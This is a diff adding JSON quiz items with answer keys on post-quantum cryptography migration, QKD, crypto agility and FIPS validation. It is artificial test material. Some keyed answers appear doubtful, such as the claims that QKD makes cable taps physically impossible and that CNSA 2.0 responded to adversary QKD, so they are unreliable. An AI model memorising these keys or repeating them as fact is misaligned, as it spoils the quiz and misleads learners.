+      {
+        "q": "Approximately how much larger are PQC (ML-DSA) TLS certificates compared to ECDSA certificates?",
+        "options": [
+          "3–4 KB larger",
+          "Roughly the same size"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Let's Encrypt has already completed issuing PQC certificates for all 400 million active certificate holders as of 2025.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which TLS version is best positioned for PQC migration due to its clean separation of key exchange, authentication, and encryption?",
+        "options": [
+          "TLS 1.3",
+          "TLS 1.2"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-b09": {
+    "questions": [
+      {
+        "q": "True or False: A Cryptography Bill of Materials (CBOM) is a structured inventory of all cryptographic assets in an organization, analogous to an SBOM.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which 2014 vulnerability became a cautionary tale for PQC migration, demonstrating that organizations often don't know which systems use a given library?",
+        "options": [
+          "Heartbleed (CVE-2014-0160)",
+          "Shellshock (CVE-2014-6271)"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Internet-facing RSA and ECDH certificate assets should be given the lowest migration priority since they are already protected by firewalls.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "Which migration priority (P1–P4) should internet-facing RSA/ECDSA certificates receive in a CBOM risk classification?",
+        "options": [
+          "P1 — migrate immediately",
+          "P3 — migrate within 5 years"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: A CBOM is a one-time deliverable — once generated, it does not need to be updated as software changes.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      }
+    ]
+  },
+  "quantum-b10": {
+    "questions": [
+      {
+        "q": "True or False: A PQC implementation that passes all NIST ACVTS Known-Answer Tests (KATs) is automatically considered safe from timing side-channel attacks.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      },
+      {
+        "q": "In the 2022 Kyber-90s timing attack, approximately how many measurements were needed to recover the private key?",
+        "options": [
+          "200,000 measurements",
+          "2 billion measurements"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Constant-time operation means the cryptographic function completes in identical wall-clock time regardless of the values of secret inputs.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which PQC algorithm has the most complex and side-channel-prone implementation due to its Gaussian sampling requirement?",
+        "options": [
+          "FALCON (FN-DSA)",
+          "ML-KEM (Kyber)"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Federal systems must use FIPS 140-3 validated PQC modules — rolling a custom PQC implementation is acceptable for federal use.",
+        "options": [
+          "True",
+          "False"
+        ],
+        "correct": 1
+      }
+    ]
+  },
+  "quantum-c01": {
+    "questions": [
+      {
+        "q": "In BB84, what QBER threshold triggers an abort of the key exchange due to suspected eavesdropping?",
+        "options": [
+          "Above 11%",
+          "Above 50%"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: In BB84, Alice and Bob publicly reveal the actual bit values (0 or 1) during basis reconciliation.",
+        "options": [
+          "False — they reveal only which bases they used, not the bits",
+          "True — sharing bits over the public channel is safe"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "An intercept-resend attack by Eve introduces approximately what level of QBER?",
+        "options": [
+          "~25%",
+          "~5%"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The no-cloning theorem guarantees which BB84 security property?",
+        "options": [
+          "Any attempt to copy a quantum state disturbs it, making eavesdroppers detectable",
+          "Quantum keys are infinitely reusable without risk of interception"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: China's Micius satellite (2017) demonstrated the first intercontinental QKD link, connecting Beijing and Vienna over approximately 7,600 km.",
+        "options": [
+          "True",
+          "False — Micius only operated within China's domestic network"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c02": {
+    "questions": [
+      {
+        "q": "What is the primary security weakness of trusted relay nodes in long-haul QKD networks?",
+        "options": [
+          "They are classical computers that hold decrypted key material and can be physically compromised",
+          "They introduce QBER errors that are detectable by both Alice and Bob"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: A compromised trusted relay node causes a measurable QBER spike that alerts the communicating parties.",
+        "options": [
+          "False — a compromised relay gives plaintext keys with no QBER signal",
+          "True — any key theft at a relay is detectable via quantum error rates"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Twin-field QKD (TF-QKD) extends QKD range by which mechanism?",
+        "options": [
+          "Both endpoints send photons to an untrusted middle relay that measures interference, not the key",
+          "Relay stations decrypt and re-encrypt keys using lattice-based algorithms"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "How many trusted relay nodes does China's 4,600 km Beijing-Shanghai quantum backbone use, each representing a potential attack point?",
+        "options": [
+          "32",
+          "4"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: The Cisco Universal Quantum Switch announced in April 2026 requires cryogenic cooling to relay quantum signals without exposing classical key material.",
+        "options": [
+          "False — it operates at room temperature on standard telecom fiber",
+          "True — cryogenic operation is required for quantum state preservation"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c03": {
+    "questions": [
+      {
+        "q": "Why does Micius operate primarily at night rather than during daylight hours?",
+        "options": [
+          "Solar photon background noise overwhelms single-photon signals during the day",
+          "Orbital mechanics prevent line-of-sight to ground stations during daytime"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: QKD-protected fiber links make passive SIGINT collection techniques like cable taps and fiber splices physically impossible.",
+        "options": [
+          "True — any measurement disturbs the photons and raises QBER",
+          "False — passive collection is still possible but limited to metadata"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What strategic shift does widespread nation-state QKD deployment force on intelligence agencies?",
+        "options": [
+          "Collection must shift from passive bulk interception to active endpoint operations, which cost more and carry higher attribution risk",
+          "Agencies gain new passive collection opportunities because QKD endpoints broadcast key material"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "During the 2017 intercontinental quantum video call, what role did the Micius satellite play in the key exchange?",
+        "options": [
+          "It was the trusted relay — distributing independent quantum keys to both the Beijing and Vienna ground stations",
+          "It provided only classical backup authentication while fiber QKD carried the keys"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: NSA issued CNSA 2.0 in 2022 partly in response to adversary QKD deployments that render passive SIGINT collection ineffective.",
+        "options": [
+          "True",
+          "False — CNSA 2.0 was issued solely to address the future threat of cryptographically-relevant quantum computers"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c04": {
+    "questions": [
+      {
+        "q": "Which of the five cryptographic agility principles ensures that old ciphertext can still be decrypted after an algorithm transition?",
+        "options": [
+          "Versioning — tagging all encrypted data with an algorithm ID",
+          "Negotiation — agreeing on the best mutual algorithm at runtime"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: ML-KEM public keys at 1184 bytes are roughly the same size as RSA-2048 public keys, so no database schema changes are needed.",
+        "options": [
+          "False — ML-KEM public keys are ~4.6x larger than RSA-2048 keys and can break undersized DB columns",
+          "True — modern databases automatically accommodate any key size"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "The SHA-1 deprecation (2011–2017) is cited as a cautionary example. How long did organizations spend in emergency remediation due to hardcoded algorithms?",
+        "options": [
+          "~7 years",
+          "~2 years"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which Cisco product allows operators to configure an ordered preference list of algorithms (e.g., ML-KEM-768, X25519Kyber768) so the strongest mutual option is auto-negotiated in IKEv2?",
+        "options": [
+          "Cisco IOS-XE with the SKIP interface",
+          "Cisco Firepower Threat Defense with legacy IKEv1"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: An anti-pattern that kills cryptographic agility is hardcoding RSA in a TLS config rather than abstracting algorithm selection behind a configurable interface.",
+        "options": [
+          "True",
+          "False — hardcoding RSA is acceptable as long as key size is 4096 bits"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c05": {
+    "questions": [
+      {
+        "q": "Why is VPN migration considered the highest HNDL priority for most enterprises?",
+        "options": [
+          "VPN traffic recorded today can be decrypted once a quantum computer exists, since DH and ECDH key exchange are broken by Shor's algorithm",
+          "VPN endpoints store private keys insecurely, making them easier to exfiltrate than other systems"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: In a hybrid X25519 + ML-KEM-768 VPN, an attacker only needs to break ML-KEM-768 to decrypt the session.",
+        "options": [
+          "False — both X25519 and ML-KEM-768 must be broken simultaneously",
+          "True — ML-KEM is the only quantum-resistant component so it is the single point of failure"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which component of an OpenVPN deployment remains safe against quantum attacks even without migration?",
+        "options": [
+          "AES-256 bulk data encryption (Grover's algorithm only halves the effective key strength to 128 bits)",
+          "RSA-2048 certificate authentication"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In December 2023, which VPN provider became the first commercial service to deploy a hybrid post-quantum key exchange in production for all users?",
+        "options": [
+          "Mullvad VPN",
+          "ExpressVPN"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: Migrating VPN peer authentication certificates from RSA to ML-DSA-65 (FIPS 204) is unnecessary because bulk encryption already provides quantum resistance.",
+        "options": [
+          "False — authentication certificates must also migrate; RSA signatures are broken by Shor's algorithm",
+          "True — RSA authentication is quantum-safe because it is only used during handshake"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c06": {
+    "questions": [
+      {
+        "q": "Why are root CA keys considered the highest-priority PQC migration target?",
+        "options": [
+          "They have 20–30 year validity periods that may span Q-Day, and a forged root signature lets an attacker impersonate any site in the trust domain",
+          "Root CAs generate keys on-demand so they can be replaced instantly with no migration effort"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: A dual-stack certificate strategy issues both RSA and ML-DSA credentials simultaneously, allowing PQC-capable clients to use ML-DSA while legacy clients fall back to RSA.",
+        "options": [
+          "True",
+          "False — dual-stack certificates are not supported by X.509 standards"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Which HSM product cannot be upgraded via firmware to support ML-KEM and ML-DSA, requiring full hardware replacement?",
+        "options": [
+          "YubiHSM 2",
+          "Thales Luna 7"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "How does the size of a full ML-DSA certificate chain (root + intermediate + end-entity) compare to an equivalent RSA chain?",
+        "options": [
+          "~7.5 KB for PQC vs ~3.6 KB for RSA — roughly double, which can cause TLS fragmentation",
+          "Roughly the same size — ML-DSA was designed to match RSA certificate dimensions"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: NIST SP 800-131A Rev 3 deprecates RSA-2048 for all new certificate issuance after 2030.",
+        "options": [
+          "True",
+          "False — RSA-2048 remains approved indefinitely under NIST guidance"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c07": {
+    "questions": [
+      {
+        "q": "Which function must be used to free secret key and shared secret buffers in liboqs, instead of the standard free() call?",
+        "options": [
+          "OQS_MEM_secure_free() — it zeroes memory before freeing",
+          "OQS_KEM_free() — it handles all associated memory automatically"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: liboqs is FIPS 140-3 validated and can be used directly in federal systems without restriction.",
+        "options": [
+          "False — liboqs is the reference implementation but is not FIPS 140-3 validated; AWS-LC (#4800) or SymCrypt (#4825) are required for federal use",
+          "True — the Open Quantum Safe project holds a FIPS 140-3 certificate for all NIST-standardized algorithms"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "In May 2024, which browser deployed X25519MLKEM768 as the default TLS key agreement, marking the first mass-market PQC deployment?",
+        "options": [
+          "Google Chrome 124",
+          "Mozilla Firefox 125"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "What is the risk of stack-allocating an ML-KEM-768 secret key (2400 bytes) inside a function?",
+        "options": [
+          "Stack overflow — the large buffer can exceed stack limits on typical systems",
+          "No risk — the stack is always zeroed by the OS after function return"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: ML-KEM keys should be generated once and reused across multiple sessions to minimize compute overhead.",
+        "options": [
+          "False — ML-KEM keys must be ephemeral; reuse leaks information about the shared secret",
+          "True — key reuse is acceptable and does not affect ML-KEM security"
+        ],
+        "correct": 0
+      }
+    ]
+  },
+  "quantum-c08": {
+    "questions": [
+      {
+        "q": "FIPS 203 was published in August 2024, but how long does CMVP validation typically take, creating a compliance gap for federal agencies?",
+        "options": [
+          "12–18 months",
+          "2–4 weeks"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: AWS-LC received FIPS 140-3 certificate #4800 for ML-KEM in Q1 2025, making it the first validated module federal agencies can deploy for quantum-safe key exchange.",
+        "options": [
+          "True",
+          "False — AWS-LC was validated for AES-256 only, not ML-KEM"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "Under the hybrid construction exception, which combination satisfies FIPS 140-3 compliance for ML-DSA before its CMVP validation is complete?",
+        "options": [
+          "Sign with both RSA-3072 (validated) AND ML-DSA-65 — both must fail to compromise security",
+          "Use ML-DSA-65 alone with a CISO memo waiving the FIPS requirement"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "OMB Memorandum M-23-02 required federal agencies to complete which action by FY2025?",
+        "options": [
+          "Begin migrating high-priority systems to PQC",
+          "Complete full enterprise-wide PQC migration with no classical algorithms remaining"
+        ],
+        "correct": 0
+      },
+      {
+        "q": "True or False: NSS (National Security Systems) follow the same CMVP validation track as civilian federal agency systems.",
+        "options": [
+          "False — NSS systems require NSA-approved Type 1 devices on a separate validation track",
+          "True — both NSS and civilian systems are governed solely by NIST CMVP"
+        ],
+        "correct": 0
+      }
+    ]
+  }
+}
